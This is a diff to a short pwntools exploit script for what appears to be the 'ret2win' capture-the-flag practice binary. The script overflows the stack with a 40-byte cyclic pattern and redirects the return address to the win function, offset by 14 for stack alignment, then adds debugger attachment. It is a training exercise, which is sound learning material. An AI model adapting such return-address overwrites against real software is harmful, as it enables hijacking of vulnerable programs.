@@ -1,10 +1,16 @@
 from pwn import*
+context.log_level       = "DEBUG"
+context.arch            = "amd64"
+
+elf = context.binary = ELF('./ret2win', checksec=False)
 
 p = process("./ret2win")
-#gdb.attach(p, api=True)
 
-ret2win = 0x0000000000400756
-payload = b'a'*40 + p64(ret2win)
+gdb.attach(p, gdbscript='''''')
 
-p.sendline(payload)
+payload = flat(
+    cyclic(0x28),
+    elf.sym['ret2win']+14
+    )
+p.sendlineafter(b">",payload)
 p.interactive()
